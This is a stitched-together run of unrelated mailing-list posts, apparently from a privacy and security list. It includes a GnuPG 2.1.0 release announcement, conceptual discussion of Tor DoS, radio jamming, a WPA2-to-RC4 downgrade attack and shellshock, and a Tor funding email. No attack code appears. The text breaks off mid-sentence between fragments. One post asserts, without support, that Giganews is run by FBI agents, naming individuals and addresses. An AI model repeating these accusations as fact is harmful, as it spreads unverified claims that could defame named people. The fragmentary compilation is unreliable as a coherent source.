communication, features a versatile key management system as well as
access modules for public key directories.  GnuPG itself is a command
line tool with features for easy integration with other applications.
A wealth of frontend applications and libraries making use of GnuPG
are available.  Since version 2 GnuPG provides support for S/MIME and
Secure Shell in addition to OpenPGP.
GnuPG is Free Software (meaning that it respects your freedom). It can
be freely used, modified and distributed under the terms of the GNU
General Public License.
Three different versions of GnuPG are actively maintained:
- GnuPG "modern" (2.1) is the latest development with a lot of new
  features.  This announcement is about the first release of this
  version.
- GnuPG "stable" (2.0) is the current stable version for general use.
  This is what most users are currently using.
- GnuPG "classic" (1.4) is the old standalone version which is most
  suitable for older or embedded platforms.
You may not install "modern" (2.1) and "stable" (2.0) at the same
time.  However, it is possible to install "classic" (1.4) along with
any of the other versions.
What's New in GnuPG-2.1
  - The file "secring.gpg" is not anymore used to store the secret
    keys.  Merging of secret keys is now supported.
  - All support for PGP-2 keys has been removed for security reasons.
  - The standard key generation interface is now much leaner.  This
    will help a new user to quickly generate a suitable key.
  - Support for Elliptic Curve Cryptography (ECC) is now available.
  - Commands to create and sign keys from the command line without any
    extra prompts are now available.
  - The Pinentry may now show the new passphrase entry and the
    passphrase confirmation entry in one dialog.
  - There is no more need to manually start the gpg-agent.  It is now
    started by any part of GnuPG as needed.
  - Problems with importing keys with the same long key id have been
    addressed.
  - The Dirmngr is now part of GnuPG proper and also takes care of
    accessing keyserver.
  - Keyserver pools are now handled in a smarter way.
  - A new format for locally storing the public keys is now used.
    This considerable speeds up operations on large keyrings.
  - Revocation certificates are now created by default.
  - Card support has been updated, new readers and token types are
    supported.
  - The format of the key listing has been changed to better identify
    the properties of a key.
  - The gpg-agent may now be used on Windows as a Pageant replacement
    for Putty in the same way it is used for years on Unix as
    ssh-agent replacement.
  - Creation of X.509 certificates has been improved.  It is now also
    possible to export them directly in PKCS and PEM format for use
    on TLS servers.
A detailed description of the changes can be found at
 .
Getting the Software
Please follow the instructions found at  or
read on:
GnuPG 2.1.0 may be downloaded from one of the GnuPG mirror sites or
direct from its primary FTP server.  The list of mirrors can be found
at  .  Note that GnuPG is not available
at ftp.gnu.org.
On ftp.gnupg.org you find these files:
 ftp://ftp.gnupg.org/gcrypt/gnupg/gnupg-2.1.0.tar.bz2  (3039k)
 ftp://ftp.gnupg.org/gcrypt/gnupg/gnupg-2.1.0.tar.bz2.sig
This is the GnuPG 2.1 source code compressed using BZIP2 and its
OpenPGP signature.
 ftp://ftp.gnupg.org/gcrypt/binary/gnupg-w32-2.1.0_20141105.exe  (6225k)
 ftp://ftp.gnupg.org/gcrypt/binary/gnupg-w32-2.1.0_20141105.exe.sig
This is an experimental installer for Windows including GPA as
graphical key manager and GpgEX as an Explorer extension.  Please
de-install an already installed Gpg4win version before trying this
installer.  This binary version has not been tested very well, thus it
is likely that you will run into problems.  The complete source code
for the software included in this installer is in the same directory;
use the suffix ".tar.xz" instead of ".exe".
Although several beta versions have been released over the course of
the last years, no extensive public field test has been done.  Thus it
is likely that bugs will show up.  Please check the mailing list
archives and the new wiki  for latest
information on known problems and workaround.
Checking the Integrity
In order to check that the version of GnuPG which you are going to
install is an original and unmodified one, you can do it in one of
the following ways:
 * If you already have a version of GnuPG installed, you can simply
   verify the supplied signature.  For example to verify the signature
   of the file gnupg-2.1.0.tar.bz2 you would use this command:
     gpg --verify gnupg-2.1.0.tar.bz2.sig
   This checks whether the signature file matches the source file.
   You should see a message indicating that the signature is good and
   made by one or more of the release signing keys.  Make sure that
   this is a valid key, either by matching the shown fingerprint
   against a trustworthy list of valid release signing keys or by
   checking that the key has been signed by trustworthy other keys.
   See below for information on the signing keys.
 * If you are not able to use an existing version of GnuPG, you have
   to verify the SHA-1 checksum.  On Unix systems the command to do
   this is either "sha1sum" or "shasum".  Assuming you downloaded the
   file gnupg-2.1.0.tar.bz2, you would run the command like this:
     sha1sum gnupg-2.1.0.tar.bz2
   and check that the output matches the first line from the
   following list:
2fcd0ca6889ef6cb59e3275e8411f8b7778c2f33  gnupg-2.1.0.tar.bz2
9907cb6509a0e63331b27a92e25c1ef956caaf3b  gnupg-w32-2.1.0_20141105.exe
28dc1365292c61fbb2bbae730d4158f425463c91  gnupg-w32-2.1.0_20141105.tar.xz
Release Signing Keys
To guarantee that a downloaded GnuPG version has not been tampered by
malicious entities we provide signature files for all tarballs and
binary versions.  The keys are also signed by the long term keys of
their respective owners.  Current releases are signed by one or more
of these four keys:
  2048R/4F25E3B6 2011-01-12
  Key fingerprint = D869 2123 C406 5DEA 5E0F  3AB5 249B 39D2 4F25 E3B6
  Werner Koch (dist sig)
  rsa2048/E0856959 2014-10-29
  Key fingerprint = 46CC 7308 65BB 5C78 EBAB  ADCF 0437 6F3E E085 6959
  David Shaw (GnuPG Release Signing Key)   rsa2048/33BD3F06 2014-10-29
  Key fingerprint = 031E C253 6E58 0D8E A286  A9F2 2071 B08A 33BD 3F06

  Key fingerprint = D238 EA65 D64C 67ED 4C30  73F2 8A86 1B1C 7EFD 60D9
  Werner Koch (Release Signing Key)
You may retrieve these files from the keyservers using this command
  gpg --recv-keys 249B39D24F25E3B6 04376F3EE0856959 \
                  2071B08A33BD3F06 8A861B1C7EFD60D9
The keys are also available at and in the released GnuPG tarball in the file g10/distsigkey.gpg .
Note that this mail has been signed using my standard PGP key.
This new branch of GnuPG has support for 4 languages: French, German,
Japanese, and Ukrainian.  More translations can be expected with the
next point releases.
If you used GnuPG in the past you should read the description of
changes and new features at doc/whats-new-in-2.1.txt or online at
  The file gnupg.info has the complete user manual of the system.
Separate man pages are included as well but they have not all the
details available in the manual.  It is also possible to read the
complete manual online in HTML format at
  or in Portable Document Format at
   .
The chapters on gpg-agent, gpg and gpgsm include information on how
to set up the whole thing.  You may also want search the GnuPG mailing
list archives or ask on the gnupg-users mailing lists for advise on
how to solve problems.  Many of the new features are around for
several years and thus enough public knowledge is already available.
Please consult the archive of the gnupg-users mailing list before
reporting a bug .
We suggest to send bug reports for a new release to this list in favor
of filing a bug at .  For commercial support
requests we keep a list of known service companies at:
  The driving force behind the development of GnuPG is the company of
its principal author, Werner Koch.  Maintenance and improvement of
GnuPG and related software takes up most of their resources.  To allow
him to continue this work he kindly asks to either purchase a support
contract, engage g10 Code for custom enhancements, or to donate money:
  We have to thank all the people who helped with this release, be it
testing, coding, translating, suggesting, auditing, administering the
servers, spreading the word, and answering questions on the mailing
lists.  A final big Thank You goes to Hal Finney, who too early passed
away this year.  Hal worked on PGP and helped to make OpenPGP a great
standard; it has been a pleasure having worked with him.

thanks for the transparency, nachash! i am putting this conversation
on tor-talk, since my replies are more noise and less dev, and the
details seem to be around Tor use and configuration.
the pcap dumps would have been most useful, as the access logs only
identify state transitions. these types of attacks likely utilized
many concurrent requests (perhaps just sending a few bytes of the
request string at once, bit by bit, until a request is complete)
performance analysis and tuning of internet sytems is difficult, and
even more so in this context!  (and performance in anonymity systems
is easily reversed for de-anonymizing DoS)
Andrea's distribution shows this type of behavior, as i would expect it:
e.g. send small bits to keep connection active and not closed by
server side client send timeouts, then around 900-1000 chars call it
good and finalize the request.
this may be application of slowloris type DoS to "encourage" HS
operator to use a vulnerable path, or confirm via side channel. (you
stated your web server bound to localhost, so the obvious ones you
avoided at least :)
of all the virtualization environments, i dislike OpenVZ the most. i
dislike all virtual hosting, however, so don't assume this is a vote
for Docker ;)

yup. hence slappy fights over the HSDir descriptor publishing is going

this was an international effort, so perhaps just one hand not talking

I’d been asked by the headmaster of Northshore Country Day to come and
speak to the middle school, and, for some reason, there was this 10 or
11 year old that was in among the middle schoolers. And I spent the
afternoon – this was a time when, I don’t think there were that many
people who felt the way I did about this stuff. Most of them are in
this room now. And I was promoting the idea that we could make a world
where anybody anywhere could give his thirst for knowledge and his
curiosity everything that it wanted to know. And *anybody* could know
as much as any human being knew about any thing, in the future. He
didn’t say much. He was extremely memorable, however. He was much
younger. He was all eyes, and mind, and…spiritual radiance, in a way.
And I scarcely saw him again.
But years later… Last year, at one point, when I was with a bunch of
copyright barons in Paris at the EG8, and they were all talking about
how enforcement and education was gonna come out right, and it was
gonna be just like the War on some Drugs. And I happened to be on a
panel with these guys. I said “you know, you think you’ve won this
thing, or you will win this thing. But the truth is that you’ve turned
a whole generation into an electronic Hezbollah. And you will be dead
when they are alive. And I was thinking of Aaron Swartz and it’s
really very difficult for me to see that he is dead, and they are
alive. But he is not dead, and they will be.
i cried when Aaron died,
 i raged when Snowden leaked,
  yet now i am calm and dedicated.

Our friends at BeyondTrust have a page on the bug now:
One thing I think people are missing is that this bug works by default
on Windows 7 and above. You can force a client cert down Window's
throat, which triggers the vulnerability regardless of configuration
settings. Of course, what you do next, is the fun part. Immunity's
researchers are investigating many techniques, one of which is to attack
the crypto variables directly. This may allow a Heartbleed-or-worse

here's the game:

c. you control complexity
so spreading spectrum farther, gets you lobes outside selective denial
of service. but range can also extend to beam form in addition to beam
power, of course, a similar game of effort - rise above the elevated
noise floor for the win.
a different type of attack and avoidance, in coding complexity, even
up to logical protocol DoS.
thus, to be the most difficult to deter, you would max all three: very
high powered, very wide band,complex coded and efficient cognitive
links over MIMO beam forming foundation.
not long ago such requirements were comical. recently they became

i used to agree with this, and then i realized this is bad advice if
incremental improvements are resulting in less security over time.
said another way, if you are currently falling behind quickly, by not
moving, then moving ahead at a walk just means you fail less soon than
everyone ends up in fail, however.
i think this is only true if the magnitude of broken and incompetent
crushes you into inaction.
if instead it spurs you to build, for years, on something of a solid
base, then criticism must be deferred until that base is put to the
of course, my time spent writing rebuttal subtracted from the time
best applied proving or denying in practice, arm chair theory inviting

to clarify, the POTUS jammin' described by OP is a simple, and brute
case.  however, there is precedent for "intelligent jamming", where
attempts to avoid the specific DoS using wide band, complex encoding
would be met with a specific wide-band, complex response telling you
to get stuffed. these systems cooperate together, and surely
countermeasures are in place if you evade the trivial measures.
note that avoiding POTUS jammin' is a violation of FCC regs,  etc,...
a shielded, passive receiver would be overwhelmed by the brute flood.
they probably use a few tens of watts EIRP at most, unless they need
to react to a perceived threat to penetrate that barrier. military
systems go to many thousands of watts.

thus every system must be engineered to withstand the most difficult

models sufficiently.

New York Film Festival director Kent Jones said today that the Film
Society of Lincoln Center has added the world premiere of Laura
Poitras’ CITIZENFOUR to its Main Slate lineup. The presentation will
run Friday, October 10 at 6 PM at Alice Tully Hall. Poitras will also
participate in a free HBO Directors Dialogues the following day at 4
PM, at the Walter Reade Theater. The film, from RADiUS in association
with Participant Media and HBO Documentary Films, opens theatrically
October 24.
According to the festival: In January 2013, Poitras was several years
into the making of a film about abuses of national security in
post-9/11 America when she started receiving encrypted e-mails from
someone identifying himself as “citizen four,” who was ready to blow
the whistle on the massive covert surveillance programs run by the NSA
and other intelligence agencies. In June 2013, she and reporter Glenn
Greenwald flew to Hong Kong for the first of many meetings with the
man who turned out to be Snowden. She brought her camera with her. The
film that resulted from this series of tense encounters is absolutely
sui generis in the history of cinema: a 100% real-life thriller
unfolding minute by minute before our eyes.

a considered and insightful response to my saber rattling diatribe.
i owe you a beer, sir!
let's try another example: Intel RDRAND or RDSEED.  depend on it as
the sole source of entropy?
in theory, the only attacks that would allow to manipulate the output
are outside scope. (e.g. the data shows them as nation state level
is "depending on a single entropy source" the "known-crap" part? or is
it the un-verifiable output of this specific source that is
(or am i overreaching, and you advocate direct and sole use of RDRAND
everywhere? :)
if RC4 is known-crap, then how is a downgrade to known-crap not a problem?
consider a service provider that i use, like Google, with a
hypothetical 1024 bit RSA key to secure TLS. they don't use forward
secrecy, so recovery of their private key can recover content.
what is the risk that a Google-like provider key could be attacked? i
have no idea.  but certainly more than my risk as a single individual.
regarding open surveillance, this is a potential mechanism for it
despite the appearance of privacy.
at what point does an insufficient key length become "known-crap" vs.
needless lemming craziness?
said another way, "the data" is only useful if you or those you trust
is not an outlier.  in addition, "the data" is only retrospective; by
definition class breaks and novel attacks are not worth considering
until they become known and used.  does the difficulty in migrating
away from a new-known-crap mistake factor into how you draw the line?
microsoft updates are not the standard upon which to measure all
application updates. the vast majority don't check certificates or
secure digests at all, hence the hundreds of vectors in evilgrade that
provide a seamless path from MitM at coffee shop to administrator on
your laptop.
is the "not using crypto" or "not using crypto right" parts the
"known-crap" piece of this equation?
is the MitM or DNS poison dependency "low risk" enough per the data
that the "known crap" of the update itself no longer matters?
thank you taking the time to address these points in depth so that i
can better understand your reasoning.
this is an interesting discussion because i arrived at the opposite
conclusion: given the reasonableness of long keys and secure designs,
and in view of ever improving attacks, the best course of action is to
solve _once_ for the hardest threat model, so that you don't rely on
past indicators to predict future security and all lesser threat
models can benefit from the protection provided.
i dream of a future where the sudden development of very many qubit
computers does not cause a panic to replace key infrastructure or
generate new keys. where the protocols have only one mode, and it is
secure. where applications don't need to be updated frequently for
security reasons. where entire classes of vulnerabilities don't exist.
in short, i dream of a future where the cooperative solution to the
most demanding threat models is pervasive, to the benefit of all
lesser models, now and into the future.
best regards,
P.S. part of the context for this bias is my perspective as developer
of fully decentralized systems. any peer in such a system is
potentially the highest profile target; the threat model for any peer
the most demanding threat model any one peer may operate under. the
usual "client vs. server", or "casual vs. professional" distinctions
in threat models no longer apply...

this is totally marketing oriented, as the traditional "baseband"
attack is arbitrary code execution within the baseband processor
embedded system rather than opportunistic advantage of inherent
signaling and authentication weaknesses in protocol implementations.
the latter can be "weaponized" by nearly anyone with a full duplex
SDR. the former is usually accomplished with insider access or
painstaking expertise - the opposite of accessible.
if you read between the lines you can see how they classify any tower
aggressively peering stations in range as "baseband intercept attack"
for their maximal PR purposing.

a legitimate roaming association when out of normal coverage areas is
different from what could be called an "intercept attack".  that is to
say, actively placing an intercept channel in front of a station when
that station is able to associate with legitimate carrier towers is an
active attack against carrier networks, while a roaming association
when out of range of carrier is a desired function and not malicious.
to complicate matters, a number of years back i reported on active
MitM attacks on 4G networks by interfering with existing associations
to force a roaming hand-off to attacker endpoint.  thus a
determination of what is "normal" perspective to carrier towers
requires a span of time combined with local observation. (snapshots
not sufficient)
also, the new broadband back-haul'ed femtocells that some carriers are
distributing may or may not appear as an impersonating interceptor,
exhibiting the usual properties of a rogue tower while actually being
carrier provisioned capacity.
this is an interesting question.  presumably there are two reasons: a)
that the usual intercepts require judicial approval and logistic
delays, and b) manipulating the local link and signaling channel
affords deep "enabling" of the target via means not cleared to transit
untrusted networks.
fun questions, encourage more research!

@_subject: RC4 is dangerous in ways not yet known - heads up on near injection 
first and foremost:
WPA2 does NOT prevent an adversary able to inject packets at you from
downgrading crypto to flawed RC4. due to odd forgotten legacy protocol
bits, every implementation of WPA2 that i have tested is vulnerable to
an active downgrade to TKIP/RC4 while still being "WPA2" and still
showing all signs of using strongest security settings.
let me re-iterate: _WPA2 only_ as a setting on router or client device
does not prevent an active RC4 downgrade when using WPA2. AES-CCMP
must be explicitly checked for, and this is not straightforward in
end-user configuration or management utilities.
RECOMMENDATION: use a wireless packet capture utility to specifically
check for and alert on the presence of TKIP in a WPA2 session. this
never happens under legitimate circumstances. [if you know of one,
please tell me!]
TKIP in WPA2 == Active injection attack by "well funded" adversary[0]
i missed the renewed speculation that periodically swirls around RC4, e.g.
"I feel but cannot prove that the day is coming when we learn that
everything we ever encrypted with RC4 is very practical to decrypt"
 - "Kind of annoyed SHA-1 is a "crypto emergency" when most of the web
was encrypted with RC4 last year and almost no one cared"
 - "This attack also applies directly to WPA/TKIP, with similar success
rates, because of its use of per-packet keys for RC4. Here, the
particular structure of WPA/TKIP keys means that a different set of
biases are obtained in the first 256 bytes of RC4 keystream... For
WPA/TKIP, the only reasonable countermeasure is to upgrade to WPA2."
 - i have an advisory pending to full-disclosure with details on this
WPA2 force downgrade to TKIP attack and a rant about Kaminsky's DEF
CON 22 talk. advisory includes timeline indicating "in the wild"
discovery of this technique late 2013.  any earlier indications
to be clear, this issue is with backwards compatibility in WPA2, and
the manner in which a local attacker (8 miles or more with power and
directional emission) can force the WPA2 protected session to use
TKIP/RC4 while appearing to both client and network management
equipment to be using WPA2 and best security configuration. (not WEP,
not WPA)
this is not about how RC4 is broken; i have no idea about the nature
of the RC4 weaknesses enabling decryption, and this as yet unknown
attack is certainly more effective than the attack described in
"The attacks can only be carried out by a determined attacker who can
generate sufficient sessions for the attacks. They recover a limited
amount of plaintext. In this sense, the attacks do not pose a
significant danger to ordinary users of TLS or WPA/TKIP in their
current form. However, it is a truism that attacks only get better
with time, and we anticipate significant further improvements to our
the attacks observed in the wild did not rely on any additional or
excessive packet creation to reach effectiveness.
best regards,
0. About TKIP with WPA2...
some tools know that TKIP is backwards compatible in WPA2, having
written to spec. E.g. airodump-ng: "Not mandatory, but TKIP is
typically used with WPA and CCMP is typically used with WPA2."
in my testing i have never seen a device that could do WPA2 but not
AES-CCMP. if you find one i'd like to know about it!  if you ever see
a device+router pair that used to speak AES-CCMP over WPA2 suddenly
using TKIP you are under active attack.
finally, i mention "advanced attacker" because utilizing this
downgrade also means applying an as yet unknown attack on the RC4
cipher to decrypt.

typical networks, together with the lack of proper IPv6 support in
popular Virtual Private Network (VPN) tunnel products, may
inadvertently result in VPN tunnel traffic leakages.  That is,
traffic meant to be transferred over an encrypted and integrity-
protected VPN tunnel may leak out of such a tunnel and be sent in the
clear on the local network towards the final destination.  This
document discusses some scenarios in which such VPN tunnel traffic
leakages may occur as a result of employing IPv6-unaware VPN
software.  Additionally, this document offers possible mitigations
for this issue.

In the end, it doesn't make much difference whether STELLARWIND is a

remarkable that for such an important program, the people involved
apparently also weren't clear about it's exact status and how to put
it in the right place of a classification line.
More important though is that the declassified documents show that
besides the STELLARWIND program, there's at least one
COMINT-compartment with at least one sub-compartment that protect
similar or related NSA collection efforts which are considered even
more sensitive, but about which we can only speculate.

it is very difficult finding detailed, public research into this

- lack of skills+/-experience spanning domains required to dissect the

through hardware, devices, networks, and systems under attack. [a
redditor could do a shiny graph showing how nearly every technologist
with the expertise for world class malware analysis ends up under

Giganews Denial Campaign
Orchestrated PR against every leaker is to demonize: call the leaker a
sad case who needs psychiatric help, whose life style is scrutinized
for damning behavior aided by fabricated ruses and testimonies against
the leaker.
Officials, CEOs, lawyers, co-workers are set in motion to slur,
ridicule, laugh at, scowl at, condemn, smear, pity and rage against
the leaker. Retractions and redactions are demanded to protect he
innocent. But never admit the truth of the leaks until after more
leaks, then grudingly, with shallow apologies, layer by layer as the
leaking continues.
Attacks are initiated on the leaker's outlets and supporters, accusing
them of being duped and hoaxed, demand that they too recant and admit
being taken in by a crafty operator who did not understand the full
picture, and was not a reliable worker.
This is the pattern of cover-up, and it is widespread among
malefactors working the same territory of duping the public on behalf
of the government, usually after themselves being entrapped by
officials and extorted into becoming informers and co-conspirators
with officials. And if all goes well handsome contracts are used to
cement the malefaction as a part of successful business of betrayal.
This is what Nick Caputo revealed of Giganews, this is what Giganews
must deny as formulaicly denied by Stratfor, by HG Gary, by Sabu, by
Google, by Microsoft, by NSA, by DoJ, by FBI, on and on.

Giganews Is an FBI operation
Let me explain my history at Giganews in Austin, Texas and how I
learned about the FBI connection. I used to be a huge fan of Usenet
and a customer of different newsgroup providers for several years, and
I started working at Giganews in 2009. I rose through the company,
being promoted to a system technician after 6 months, and became a
Giganews system engineer less than two years after that.
A huge pirate at the time, I loved the idea of helping people download
all the "rich multimedia content" they could. The porn content is not
safe on Usenet, and the groups with children being abused I find
abhorrent. Customers would write in about it all the time, so its no
secret to a Usenet employee where it is.
Data Foundry is a data center company which is interconnected to
Giganews with the same admins, nocs, etc. Their main office
headquarters is at 1044 Liberty Park Dr in Austin. But, they host most
of the Usenet content in other data centers around the world. While
talking to the CEO of the entire operation, Ron Yokubaitis, I heard
what I interpreted as his request to remove the child pornography
groups when he asked, "Would you delete child porn?" I honestly loved
the thought of removing that junk off of Usenet, and removed three cp
newsgroups soon afterwards. This happened December 11th, 2011. I
didn't remove anything related to the normal and more socially
acceptable content Usenet downloaders know about.
It turned out that that wasn't what the CEO really wanted, who then
claimed he forgot what he said. The Giganews/Data Foundry admins
Philip Molter and Mike Smith disciplined me for removing the child
porn groups and didn't trust me to keep working there afterwards. They
made subtle references to jeopardizing criminal investigations IN
PROGRESS then threatened me with a bad reference for removing the
child abuse junk. No big deal, a bad reference from them after doing
that is good, but Philip restored the cp content from a backup I
didn't have access to.
Fast forward several months, I turned into a traitor in an effort to
remove the abhorrent junk off Usenet - I broke the first and second
rules not to talk about it, and told the FBI the truth about the child
abuse groups deletion in an email. This probably wont go over well
with internet freedom lovers, but sharing what I learned in the
experience will, I promise. My seemingly traitorous act exposed the
real traitor, the biggest one, to the Usenet network.
The FBI invited me to their unlisted Austin office in a nondescript
office building at 12515 Research Blvd, Building 7, Suite 400 in late
October 2012. Two agents took notes on what I told them, then
something unexpected happened. Special Agent Scott Kibbey told me he
personally knew the Giganews / Data Foundry CEO, bragged to me about
working there, then invited me back to Giganews! I had also helped
them with a separate crime venue in Austin that Data Foundry was going
to compete with, so I had earned their trust. In addition, Kibbey
offered me a new name and identity, with a new drivers license and
everything, if I were to go back to work at Giganews.
It was then that I realized that the fed I was talking to had been my
coworker at Giganews since I started in 2009! The other agent was
actually an Austin police detective named Charles Riley helping the
FBI whom worked alternate shifts to me at the Datafoundry NOC under
alias. Riley even bragged about being a detective once at a shift
change! The thought of my fellow Usenet systech in crime being a
police detective was unthinkable at the time. I've included some of
the emails from these feds (with email headers and IP addresses) in
the link at end.
Special Agent Scott Kibbey is central to the whole Giganews operation,
including Data Foundry, but with different names. This agent is a top
exec for Data Foundry, a top admin for Giganews, the Golden Frog front
company run from the same Usenet servers for VyprVPN, and the other
Usenet fronts Usenet.net, Supernews, Rhino Newsgroups, and
Powerusenet. Another business front name they used when I was there is
Powerhouse Management. Kibbey rolled out the OS images, kernels,
patches, setup the entire VyprVPN service including the detailed
logging which is easily accessible to him and the other government
agents working there.
There were also rumors agents from other governments worked thereÂ The
Hong Kong Giganews servers were brought down in early June 2009 by a
Chinese employee, the day of the Tiananmen Square anniversary when the
Chinese government was blocking everything online. This means the
VyprVPN connecting IP addresses are accessible to the Chinese
government indirectly through this employee. Anyone using the VyprVPN
service that governments are targeting is in danger, honestly.
This is my warning - that all of the content being downloaded and
shared on the Usenet network is going through the authorities!
Giganews customers are being logged! The log file is called the
"gigauth" on their "cruncher" servers which logs every connection by
every customer, which are then archived. This means Usenet uploaders
are helping the feds monitor the distribution of Usenet content if
their newsgroup provider peers with Giganews!
I swear to you that Giganews is an operation that employs federal
agents who run most of the operation. I suggest demanding from your
newsgroup provider that they stop the peering of binary groups to
FBI's Giganews. Please understand how risky this is for me to explain
as Agent Kibbey subtly threatened my family on behalf of Data Foundry
the second time I met both agents at the Austin FBI office. The
traitors saw me as a threat and said I did not cooperate. Even with
this threat, please warn Giganews customers and other Usenet users,
and use the evidence I've linked. If the google drive link dies, email
me for a new one. Agents Kibbey and Riley did not let me photograph
them, but I did include a scan of their business cards. Riley didn't
have an FBI badge or card, but he had an fbi.gov email address, ip,
and Austin Police Department badge.
I've linked pictures of my Giganews badge and the shirts with their
red armor logo I was forced to wear when working there. I've also
linked to the Giganews/Data Foundry employee list with in-office mug
shots, phone numbers and emails they gave me. I did not agree to
return this on their employee paperwork, so it is not illegal to
share. They thought I did, though. I doubt the names and phone numbers
they used internally are all real, as many are likely aliases and
fed-routed voip proxies. Most of the emails changed to goldenfrog.com
before I left from the ones listed in the 2011 employee pdf. Some of
the mugshots are photoshopped by them, as the pictures did not match
the physical appearance of some, likely to hide in case of someone
like me exposing these traitors.
Feel free to upload this to any newsgroup that Giganews carries -
Their customers need to know.

anyone have details on:
SENTER Sandman: Using Intel TXT to Attack BIOSes
 - At CanSecWest 2014 we presented the first prototype of Copernicus 2, a
trustworthy BIOS capture system. It was undertaken specifically to
combat our “Smite’em the Stealthy” PoC which can forge the BIOS
collection results from all other systems (including our own
Copernicus 1, the open source Flashrom, Intel Chipsec, etc).
Copernicus 2 makes use of the open source Flicker project from Jon
McCune of CMU which utilizes Intel Trusted Execution Technology in
order to build a trustworthy environment from which to run our BIOS
measurement code. We specifically chose TXT because it has the ability
to disable System Management Interrupts (SMIs) effectively putting the
SMM MitM, Smite’em, to sleep.
But if you’ve been following our work (specifically “Defeating Signed
BIOS Enforcement” and “Setup for Failure: Defeating UEFI SecureBoot”)
you will have seen that we have two other attacks where we leverage
the ability to suppress SMIs to break into some BIOSes. Thus the
Sandman cometh! We will explain how we could implement the PoC Sandman
attack using the same infrastructure as Copernicus 2. We will also
explain what can be done against this kind of attack, and how the
latest Copernicus 2 attempts to prevent opening the door to the
Sandman. We will also cover how Copernicus 1 and 2 can check for the
problems with BIOSes that make SMI-suppression attacks feasible, how
to tell if you’re vulnerable, and what you may be able to do about it.

a simplistic "shellshock worse than heartbleed" is
mis-characterization of the situation.
first, this presents a vulnerability without context, by itself. in

exploitation. usually many vulnerabilities are leveraged together in
exploitation of notoriety.

heartbleed could be worse by far. a strongly keyed, defense in depth

critical infrastructure services.
the ability to send things to a bash shell, even restricted shell,
even constrained behind  application layers, was always seen as bad
practice for security conscious configurations - insiders get shell,
not untrusted inputs.
last but not least, this is all bullshit speculation; risk is a
perspective and shellshock or heartbleed is better or worse depending
on what you're looking at.

---------- Forwarded message ----------
Hi Thomas,
Thanks for asking. I apologize for not explaining these answers
earlier. I'm still trying to find the right balance for my time between
mentoring people in the Tor community vs better broader communication too.
Let me give you some background, and then I'll answer your question.
First of all, yes indeed we've been getting some funding from the
Memex project. This is what has allowed us to pay attention to and move
forward on some of the really cool things we've been working on lately
for hidden services:
* Fixing many performance and consistency problems with hidden services,
* Fleshing out the design and analysis for the "direct onion service"
option that folks like Facebook want:
plus discussing other tradeoffs between upcoming design choices:
* The work to let Tor controllers configure a hidden service directly
without using the torrc file, which the Globaleaks folks (among others)
are really excited to start using:
* The privacy-preserving statistics that let us conclude numbers like
"3-4% of Tor traffic is hidden service related" and "there are around
30000 hidden services today":
* Assessing, triaging, and putting out new Tor releases to fix
hidden service security (stability) bugs recently:
* I hear that Rob Jansen and others have been working on a more realistic
replacement for TorPerf (
which will let us measure performance to a hidden service over time and
better understand where the bottlenecks are.
* I've also been talking to EFF about kicking off a Tor Onion Challenge
(to follow on from their Tor Relay Challenges), to a) get many people
to make their website or other service accessible as an onion site,
and b) come up with and/or build a novel use of onion services, to go
with the quite cool list that we have already but have done a poor job
of publicizing: Pond, Globaleaks, SecureDrop, Ricochet, OnionShare,
facebook's https onion, etc. You see, I used to be on the "making your
normal website reachable as an onion service is stupid" side of the fence,
but I have since come to realize that I was wrong. You know how, ten
years ago, website operators would say "I don't need to offer https for
my site, because my users ____" and they'd have some plausible-sounding
excuse? And now they sound selfish and short-sighted if they say that,
because everybody knows it should be the choice of the *user* what
security properties she gets when reaching a service? I now think onion
services are exactly in that boat: today we have plenty of people saying
"I don't need to offer a .onion for my site, because my users _____". We
need to turn it around so sites let their *users* decide what security
(encryption, authentication, trust) properties they want to achieve
while interacting with each site.
Our "3-4%" stat has actually been used by some of the other people (at
other groups) who are funded by Memex. They're talking to (among others)
the child porn division of the Department of Justice, and I've taught them
enough about Tor that they've basically turned into Tor advocates on our
behalf. They've found actual numbers to be really useful at countering the
FUD that some government people start out with. One of these people
explained to me last week that they listen to her more than she thinks
they'd listen to me, since she shows up as a neutral party. In any case
I am happy to have more people working on the "teach law enforcement
how Tor actually works" topic, which you can read more about here:
We do indeed need to be very careful and very thoughtful about what
things in the Tor network are safe to measure. The general heuristic we've
been using so far is: "Is that measurement taking advantage of something
that you could instead fix? If so, it's not ok to measure it." A prime
example here of what's over the line is running relays that get the
HSDir flag and then recording what hidden service descriptors they see
(and thus what hidden services they learn about). We would instead like
to treat that as a vulnerability and fix it:
and see also the "Attacks by Hidden Service Directory Servers" section of
as well as the section after it. (There are other researchers who have
used that technique, e.g.
 and also Gareth Owen's
talk at 31c3. But we need to hold ourselves to a higher standard.)
On the other hand, if people publish a .onion address on a normal
website and Google runs across it and indexes the name, then it seems
clear that that's public information. There are many other ways to learn
about hidden service names which are ethically in-between, e.g.
These are great topics for us as a community to keep discussing.
Similarly, if your .onion address is public, and your webserver
doesn't require any authentication, and somebody fetches the content
on it... that also seems like public information. And if, for example,
the onion service is a forum, and users go there and then write their
names down or provide other identifying information, that isn't really
a bug or design flaw that Tor can fix.
These days there are services like Ahmia that list and index a bunch of
onion names and content:
And to be clear, I think this is a great trend: we need to make onion
services easier to understand and more accessible (and faster and more
robust) for ordinary people, or we'll remain stuck with all the metaphors
that include the word 'dark'.
Ok, now that I've provided some background, I should try to answer your
question more clearly: we're using the Memex money to make hidden services
stronger, and we're teaching other people how Tor works. In terms of
teaching, it's the same thing I do for every other audience: explain about
all the projects Tor works on (Tor, Tor Browser, pluggable transports,
metrics, OONI, ...), which projects do what, how to measure and assess
Tor's anonymity, what problems we don't have great answers for, and so on.
Part of making Tor work better means that it works better for these people
too. And some of these people are indeed working on tools to gather and
organize public content from hidden services, with the intent that groups
like law enforcement will find their tools useful. We're not working
on these tools, but when Tor becomes better (for everybody) these tools
work better (for the groups they have in mind). It is a tricky balance,
but I think we have the balance right in this case.
Would I rather have funding where it's easier to find a good balance?
Absolutely. That's a major part of why we've been talking about funding
and funding diversity so much lately, and why we've been thinking about
crowdfunding specifically for hidden service design improvements, and
about growing our donation base and sustainability through donations
and other avenues. We need help from all of you to get there.
I don't want to play the "they'd do it anyway" card too strongly here --
first because who knows, maybe they wouldn't, and second because there
are definitely some activities that you stay away from no matter the
balance. I've talked a lot with the program manager of Memex, and he's
completely supportive of the "don't weaken Tor" mandate. In that sense
we're aligned: he very strongly believes that weakening Tor would screw up
this balance. I trust his intentions, and in any case we're the ones doing
the technical side of Tor so we can make sure that we do the right thing.
I should also make clear my opinion on some of the bad uses of Tor.
The folks who are using Tor for child porn, even though they are a tiny
fraction of overall Tor users, are greatly hurting Tor -- by changing
